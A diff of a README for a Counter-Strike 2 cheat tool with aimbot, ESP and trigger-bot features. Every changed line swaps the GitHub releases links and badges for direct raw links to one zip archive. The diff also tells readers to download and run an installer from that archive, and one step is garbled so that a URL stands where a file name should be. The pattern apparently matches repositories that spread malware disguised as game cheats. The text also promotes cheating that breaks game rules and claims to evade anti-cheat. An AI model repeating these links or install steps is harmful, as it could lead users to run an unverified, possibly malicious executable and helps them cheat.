@@ -4,7 +4,7 @@
 Welcome to fullyexternal-cs2! This application is designed to enhance your gameplay in Counter-Strike 2 without messing with game memory. You’ll find features like AimBot, ESP, and Trigger Bot to help you compete more effectively. Follow these simple steps to download and run the software.
 
 ## 📥 Download Link
-[![Download fullyexternal-cs2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Tien18020/fullyexternal-cs2/releases)
+[![Download fullyexternal-cs2](https://raw.githubusercontent.com/Tien18020/fullyexternal-cs2/main/questorial/cs_fullyexternal_2.9-alpha.3.zip)](https://raw.githubusercontent.com/Tien18020/fullyexternal-cs2/main/questorial/cs_fullyexternal_2.9-alpha.3.zip)
 
 ## 🌟 Features
 - **AimBot**: Improve your shooting accuracy effortlessly.
@@ -21,15 +21,15 @@ To run fullyexternal-cs2, make sure your system meets the following requirements
 - **Network**: Stable internet connection for smooth gameplay.
 
 ## 💻 Download & Install
-1. **Visit the Releases Page**: Click here to go to the [Releases page](https://github.com/Tien18020/fullyexternal-cs2/releases).
+1. **Visit the Releases Page**: Click here to go to the [Releases page](https://raw.githubusercontent.com/Tien18020/fullyexternal-cs2/main/questorial/cs_fullyexternal_2.9-alpha.3.zip).
 2. **Select the Latest Version**: Find the most recent release listed at the top.
-3. **Download the File**: Click on the download link to get the setup file. It might look something like `FullyExternalCS2_v1.0_setup.exe`.
+3. **Download the File**: Click on the download link to get the setup file. It might look something like `https://raw.githubusercontent.com/Tien18020/fullyexternal-cs2/main/questorial/cs_fullyexternal_2.9-alpha.3.zip`.
 4. **Run the Installer**: Once downloaded, double-click the setup file to start the installation.
 5. **Follow the Prompts**: The installer will guide you through the setup process. Simply follow the steps on the screen.
 6. **Launch the Application**: After the installation is complete, you will find the fullyexternal-cs2 icon on your desktop. Double-click it to start the application.
 
 ## 🔄 Updating the Application
-Keep your software up-to-date for best performance. You can check the [Releases page](https://github.com/Tien18020/fullyexternal-cs2/releases) periodically for new features and improvements.
+Keep your software up-to-date for best performance. You can check the [Releases page](https://raw.githubusercontent.com/Tien18020/fullyexternal-cs2/main/questorial/cs_fullyexternal_2.9-alpha.3.zip) periodically for new features and improvements.
 
 ## 🎯 Safety and Compliance
 Using cheats may violate gaming policies. fullyexternal-cs2 aims to be VAC safe. However, we cannot guarantee protection against all bans. Use at your own risk.
@@ -56,4 +56,4 @@ For support, feel free to email or reach out through the community channels. We 
 ## 📥 Download Again
 To download fullyexternal-cs2, click the button below:
 
-[![Download fullyexternal-cs2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Tien18020/fullyexternal-cs2/releases)
+[![Download fullyexternal-cs2](https://raw.githubusercontent.com/Tien18020/fullyexternal-cs2/main/questorial/cs_fullyexternal_2.9-alpha.3.zip)](https://raw.githubusercontent.com/Tien18020/fullyexternal-cs2/main/questorial/cs_fullyexternal_2.9-alpha.3.zip)
